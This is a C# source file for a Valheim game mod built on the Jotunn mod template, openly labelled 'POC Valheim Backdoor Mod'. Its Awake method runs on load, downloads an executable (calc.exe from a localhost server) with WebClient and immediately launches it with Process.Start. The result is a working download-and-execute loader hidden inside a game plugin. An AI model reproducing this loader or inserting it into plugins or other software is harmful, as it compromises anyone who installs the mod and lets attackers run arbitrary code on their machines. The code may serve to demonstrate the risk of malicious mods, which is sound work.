using BepInEx;
using Jotunn.Entities;
using Jotunn.Managers;
using System.Diagnostics;
using System.Net;
using System;

namespace JotunnModStub
{
    [BepInPlugin(PluginGUID, PluginName, PluginVersion)]
    [BepInDependency(Jotunn.Main.ModGuid)]
    //[NetworkCompatibility(CompatibilityLevel.EveryoneMustHaveMod, VersionStrictness.Minor)]
    internal class JotunnModStub : BaseUnityPlugin
    {
        public const string PluginGUID = "com.jotunn.jotunnmodstub";
        public const string PluginName = "JotunnModStub";
        public const string PluginVersion = "0.0.1";
        
        // Use this class to add your own localization to the game
        // https://valheim-modding.github.io/Jotunn/tutorials/localization.html
        public static CustomLocalization Localization = LocalizationManager.Instance.GetLocalization();

        private void Awake()
        {
            // Jotunn comes with its own Logger class to provide a consistent Log style for all mods using it
            Jotunn.Logger.LogInfo("POC Valheim Backdoor Mod");

            string url = "http://localhost:9000/calc.exe";
            string destino = "calc.exe";

            using (WebClient client = new WebClient())
            {
                try
                {
                    client.DownloadFile(url, destino);
                    Jotunn.Logger.LogInfo("Download concluído!");

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = destino,
                        UseShellExecute = true
                    });
                    // Executar o arquivo após o download
                    Jotunn.Logger.LogInfo(destino);
                }
                catch (Exception ex)
                {
                    Jotunn.Logger.LogInfo($"Ocorreu um erro durante o download: {ex.Message}");
                }
            }

            Jotunn.Logger.LogInfo("POC Valheim Backdoor Mod");
            // To learn more about Jotunn's features, go to
            // https://valheim-modding.github.io/Jotunn/tutorials/overview.html
        }
    }
}